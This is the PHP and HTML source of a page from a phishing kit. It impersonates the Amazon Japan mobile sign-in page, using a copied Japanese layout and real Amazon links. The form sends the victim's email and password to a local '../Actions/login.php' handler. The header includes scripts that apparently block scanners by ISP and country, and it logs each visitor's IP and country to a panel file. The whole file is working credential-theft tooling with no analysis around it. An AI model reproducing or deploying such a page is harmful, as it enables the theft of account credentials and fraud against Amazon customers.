<?php
session_start();
include('__CONFIG__.php');
require "../Library/ClassFunction/Blockisp.php";
include 'bahasa.php';
include '../block_country.php';
include '../Library/ClassFunction/curldataip.php';

$file = fopen('../panel/country.txt', "a");
$time = date('H:i dS F');
fwrite ($file, " IP $showIP Dari $showCountry Mengakses Login Page\r\n ");
fclose( $file );

   ?>
<!doctype html>
<html lang="en">
   <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <!-- Required meta tags -->
      
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <!-- Bootstrap CSS -->
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
      <link rel="stylesheet" type="text/css" href="../Sheets/mobile.css" />
      <script src="https://cdn.jsdelivr.net/jquery/1.12.4/jquery.min.js"></script>
      <script src="https://cdn.jsdelivr.net/jquery.validation/1.15.1/jquery.validate.min.js"></script>
      <link rel="shortcut icon" href="../Assets/img/favicon.ico" />
   </head>
   <style>
   
   $errorMsgColor: #ff0000;
       .error {
    color: #ff0000;
  }
       
   </style>
   
   <!-- Navbar -->
   <body>
      <nav class="navbar navbar-default">
         <a class="navbar-brand" href="#">
         <img src="../Assets/img/logo.png" width="90" height="30" alt="">
         </a>
      </nav>
      <div class="a-container">
         <form name="signIn" method="post" novalidate="" action="../Actions/login.php" class="auth-validate-form auth-clearable-form" data-fwcim-id="r8JCGHxQ">
            <div>
               <h1 class="a-spacing-micro a-spacing-top-small a-text-left"> ログイン</h1>
            </div>
            <div class="a-section a-spacing-base a-text-right">
               <a id="auth-fpp-link-bottom" class="a-link-normal" target="_top" tabindex="9" href="https://www.amazon.co.jp/ap/forgotpassword?clientContext=355-2805611-3759645&amp;showRememberMe=true&amp;openid.pape.max_auth_age=900&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;siteState=clientContext%3D357-9056494-8091623%2CsourceUrl%3Dhttps%253A%252F%252Fwww.amazon.co.jp%252Fcpe%252Fmanagepaymentmethods%253Fref_%253Dya_d_c_pmt_mpo%2Csignature%3DAfgNRFxEKA34zS0gj2Bj7iI2c8Lo4j3D&amp;marketPlaceId=A1VC38T7YXB528&amp;pageId=anywhere_jp&amp;ignoreAuthState=1&amp;fromAuthPrompt=1&amp;openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fcpe%2Fmanagepaymentmethods%3Fref_%3Dya_d_c_pmt_mpo&amp;prevRID=9NFNEG2BX21E6N14JGYS&amp;openid.assoc_handle=anywhere_v2_jp&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;ref_=ap_sw_aa&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;disableLoginPrepopulate=1&amp;switch_account=signin&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">
               パスワードを忘れた方
               </a>
            </div>
            <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
               <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><input type="email" maxlength="128" id="ap_email" placeholder="Eメールまたは携帯番号アカウントの番号" name="email" tabindex="1" autocorrect="off" autocapitalize="off"></div>
               <div id="ap_email_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <div id="auth-password-container" class="a-input-text-wrapper auth-required-field auth-password-container auth-password auth-fill-password">
                  <input type="password" maxlength="1024" id="ap_password" placeholder="Amazonのパスワード" name="password" tabindex="2">
                  <div class="a-row auth-visible-password-container auth-show-password-empty">
                     <span class="a-size-small a-color-secondary auth-visible-password"></span>
                  </div>
               </div>
               <div id="ap_password_icon" class="auth-clear-icons" style="display: none;">
                  <i class="a-icon a-icon-close" role="img"></i>
               </div>
               <input type="hidden" name="showPasswordChecked" value="true" id="ap_show_password_checked"> 
            </div>
            <div class="a-row">
               <div class="a-column a-span12 a-spacing-medium">
                  <div id="auth-show-password-checkbox-container" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox auth-show-password-checkbox"><label for="auth-show-password-checkbox"><input id="auth-show-password-checkbox" type="checkbox" name="" value="" checked="" tabindex="3"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
                     パスワードを表示
                     </span></label>
                  </div>
                  <div class="a-row a-spacing-base">
                     <div data-a-input-name="rememberMe" class="a-checkbox a-checkbox-fancy a-control-row a-touch-checkbox">
                        <label>
                           <input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i>
                           <span class="a-label a-checkbox-label">
                              ログインしたままにする
                              <span class="a-declarative" data-action="a-modal" data-a-modal="{&quot;max-width&quot;:&quot;500px&quot;,&quot;width&quot;:&quot;95%&quot;,&quot;name&quot;:&quot;remember-me-detail-link-modal&quot;,&quot;header&quot;:&quot;[ログインしたままにする] チェックボックス&quot;}">
                              <a id="remember_me_learn_more_link" class="a-link-normal" href="#">
                              詳細
                              </a>
                              </span>
                              <div class="a-popover-preload" id="a-popover-remember-me-detail-link-modal">
                                 <div class="a-section a-spacing-large a-spacing-top-mini">
                                    <p>
                                    </p>
                                    <p>「ログインしたままにする」を選択すると、このデバイスでログインが求められる回数が減ります。</p>
                                    <p>お客様のアカウントのセキュリティを保つため、個人でお使いのデバイスでのみこのオプションを使うようにしてください。</p>
                                    <p></p>
                                 </div>
                              </div>
                           </span>
                        </label>
                     </div>
                  </div>
                  <div class="a-section">
                     <div class="a-button-stack">
                        <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-share-credential-off"><span class="a-button-inner"><input id="signInSubmit" tabindex="6" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
                        ログイン
                        </span></span></span>
                        <div class="a-section a-spacing-medium">
                           <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
                              続行することで、 Amazonの<a href="/gp/aw/help/ref=ap_mobile_signin_notification_condition_of_use?id=643006">利用規約</a>および<a href="/gp/aw/help/ref=ap_mobile_signin_notification_privacy_notice?id=643000">プライバシー規約</a>に同意するものとみなされます。
                           </div>
                        </div>
                        <div class="a-section a-spacing-medium a-text-center">
                           <div class="a-divider a-divider-break">
                              <h5>Amazonの新しいお客様ですか？</h5>
                           </div>
                           <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="7" href="https://www.amazon.co.jp/ap/register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=anywhere_jp&amp;ignoreAuthState=1&amp;fromAuthPrompt=1&amp;openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fgp%2Faw%2Fpsi.html%3Fie%3DUTF8%26cartID%3D356-3321293-2507529%26destinationURL%3D%252Fgp%252Faw%252Fya%26packedQuery%3Dref_%257Cnavm_em_your_account&amp;prevRID=43C1VDW522PCSNQXZQJ4&amp;openid.assoc_handle=anywhere_v2_jp&amp;openid.mode=checkid_setup&amp;openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;ref_=ap_sw_aa&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;disableLoginPrepopulate=1&amp;switch_account=signin&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="a-button-text" role="button">
                           新しいAmazonのアカウントを作成
                           </a></span></span>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </form>
      </div>
      <script>
          // Wait for the DOM to be ready
$(function() {
  // Initialize form validation on the registration form.
  // It has the name attribute "registration"
  $("form[name='signIn']").validate({
    // Specify validation rules
    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 6
      }
    },
    // Specify validation error messages
    messages: {
      password: {
        required: "パスワードを入力してください",
        minlength: "パスワードの長さは最低6文字です。"
      },
      email: "Eメールアドレスまたは携帯電話番号を入力"
    },
    // Make sure the form is submitted to the destination defined
    // in the "action" attribute of the form when valid
    submitHandler: function(form) {
      form.submit();
    }
  });
});
          
      </script>
      
   </body>
</html>